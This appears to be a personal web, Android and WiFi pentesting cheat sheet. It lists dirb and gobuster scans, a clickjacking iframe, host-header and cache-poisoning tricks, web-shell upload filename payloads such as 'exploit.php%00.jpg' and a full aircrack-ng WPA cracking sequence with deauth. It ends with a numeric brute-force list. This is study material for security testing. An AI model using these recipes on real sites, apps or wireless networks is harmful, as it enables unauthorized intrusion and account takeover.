# CIA
	Integrity : data only change by auth.
	Avalability : Avalable data when user need.
	Confidentility : Data access by auth.
  
# Containt Discover
	dirb https://domain.com/ /usr/share/wordlists/dirb/big.txt
	gobuster -u http://fakebank.com -w wordlist.txt dir 
		
# directory Traversal
	dirb https://domain.com/ /usr/share/wordlists/wfuzz/vulns/dirTraversal-nix.txt
	
# ClickJacking
https://numberless-holddown.000webhostapp.com/clickjacking.php?url={url}
or
		
		<!DOCTYPE html>
		<html lang="en">
		<head>
		  <meta charset="UTF-8">
		</head>
		<body>
		  <iframe src="{url}" frameborder="0"></iframe>
		</body>
		</html>

# Host Header Poisoning
## Basic
	Change "Host" header 

## via middleware (for password reseting)
	Add X-Forwarded-Host: <domain.com>
https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware
	
## via dangling markup
	Try "Host: domain.com" to "Host: domain.com:attacker.com"
https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup

# Web Caches Poisioning
## Via an unkeyed header
	This lab supports the X-Forwarded-Host header. 
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header
	
## Via an unkeyed cookie
	change cookies value.
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie
	
## Via multiple headers
	Add:
		X-Forwarded-Scheme:http
		X-Forwarded-Host: example.com
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers
	
# RCE
## Basic
	not delete @PNG
	Upload Php File
	
## via Content-Type restriction bypass
	Change "Content-Type" header
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass
	
## via path traversal
	Change file name "test.php" to "..%2ftest.php"
https://www.youtube.com/watch?v=4R3PUhiFzS4
	
## via obfuscated file extension
	change file name filename="exploit.php%00.jpg"
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension
	
## via race condition
https://www.youtube.com/watch?v=mt0BN5pYHXI </br>
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition
	
# No Rate Limit
## via brute force
	send request to intruder
## via Race Condition
	Send request to turbo
	add "race.py" payload
	add "test: %s" header in header



# Android Apk VAPT
## Insecure-data-storage
	find savedpref crenditial using adb
https://www.youtube.com/watch?v=x8keYIWFzbY
https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage

## BACKUP FLAG TRUE ENABLED
	go to AndroidManifest.xml and search "backup" if backup is not found or may be its true thats means its  vulnerable
	
## Exploiting Apps vulnerable to Janus (CVE-2017–13156)
A serious vulnerability in Android allows attackers to inject a DEX file into an APK file without affecting the signatures. (i.e. modify the code in applications without affecting their signatures.) </br>
We use apksigner tool to find the signature schemes used by the application</br>

	apksigner verify -verbose h5.apk
	
https://medium.com/mobis3c/exploiting-apps-vulnerable-to-janus-cve-2017-13156-8d52c983b4e0


# Wifi Password Hacking
	

	Step 1:

	Put your wireles lan card on monitor mode

	 airmon-ng start "wireless lan card name"
	=> airmon-ng start wlan0

	Step 2:

	Capture Traffic with Airodump-ng

	airodump-ng "wireless lan card monitor mode"

	=> airodump-ng wlan0mon


	Step 3:

	Focus airodump-ng on one AP on One Channel

	 airodump-ng --bssid dummy -c dummy --write WPAcrack wlan0mon

	=> airodump-ng --bssid 8C:FD:18:88:79:68 -c 9 --write WPAcrack wlan0mon


	Step 4:

	in order to capture the encrypted password we need to have the client authenticate against AP.
	we do deauth signal to client

	 aireplay-ng --deauth 1000 -a bssid wlan0mon

	=> aireplay-ng --deauth 1000 -a 8C:FD:18:88:79:68 wlan0mon


	Step 5:

	Now we have to crack the dump file with aircrack-ng

	 aircrack-ng WPAcrack-01.cap -w (localtion of wordlist)
	 
#Password List For Pentesting 
## Mobile Number
1230005499
1230005500
1230005501
1230005502
1230005503
1230005504
1230005505
1230005506
1230005507
1230005508
1230005509
1230005510
1230005511
1230005512
1230005513
1230005514
1230005515
1230005516
1230005517
1230005518
1230005519
1230005520
1230005521
1230005522
1230005523
1230005524
1230005525
1230005526
1230005527
1230005528
1230005529
1230005530
1230005531
1230005532
1230005533
1230005534
1230005535
1230005536
1230005537
1230005538
1230005539
1230005540
1230005541
1230005542
1230005543
1230005544
1230005545
1230005546
1230005547
1230005548
1230005549
1230005550
1230005551
1230005552
1230005553
1230005554
1230005555
1230005556
1230005557
1230005558
1230005559
1230005560
1230005561
1230005562
1230005563
1230005564
1230005565
1230005566
1230005567
1230005568
1230005569
1230005570
1230005571
1230005572
1230005573
1230005574
1230005575
1230005576
1230005577
1230005578
1230005579
1230005580
1230005581
1230005582
1230005583
1230005584
1230005585
1230005586
1230005587
1230005588
1230005589
1230005590
1230005591
1230005592
1230005593
1230005594
1230005595
1230005596
1230005597
1230005598
1230005599
1230005600
1230005601
1230005602
1230005603
1230005604
1230005605
1230005606
1230005607
1230005608
1230005609
1230005610
1230005611
1230005612
1230005613
1230005614
1230005615
1230005616
1230005617
1230005618
1230005619
1230005620
1230005621
1230005622
1230005623
1230005624
1230005625
1230005626
1230005627
1230005628
1230005629
1230005630
1230005631
1230005632
1230005633
1230005634
1230005635
1230005636
1230005637
1230005638
1230005639
1230005640
1230005641
1230005642
1230005643
1230005644
1230005645
1230005646
1230005647
1230005648
1230005649
1230005650
1230005651
1230005652
1230005653
1230005654
1230005655
1230005656
1230005657
1230005658
1230005659
1230005660
1230005661
1230005662
1230005663
1230005664
1230005665
1230005666
1230005667
1230005668
1230005669
1230005670
1230005671
1230005672
1230005673
1230005674
1230005675
1230005676
1230005677
1230005678
1230005679
1230005680
1230005681
1230005682
1230005683
1230005684
1230005685
1230005686
1230005687
1230005688
1230005689
1230005690
1230005691
1230005692
1230005693
1230005694
1230005695
1230005696
1230005697
1230005698
1230005699
1230005700
1230005701
1230005702
1230005703
1230005704
1230005705
1230005706
1230005707
1230005708
1230005709
1230005710
1230005711
1230005712
1230005713
1230005714
1230005715
1230005716
1230005717
1230005718
1230005719
1230005720
1230005721
1230005722
1230005723
1230005724
1230005725
1230005726
1230005727
1230005728
1230005729
1230005730
1230005731
1230005732
1230005733
1230005734
1230005735
1230005736
1230005737
1230005738
1230005739
1230005740
1230005741
1230005742
1230005743
1230005744
1230005745
1230005746
1230005747
1230005748
1230005749
1230005750
1230005751
1230005752
1230005753
1230005754
1230005755
1230005756
1230005757
1230005758
1230005759
1230005760
1230005761
1230005762
1230005763
1230005764
1230005765
1230005766
1230005767
1230005768
1230005769
1230005770
1230005771
1230005772
1230005773
1230005774
1230005775
1230005776
1230005777
1230005778
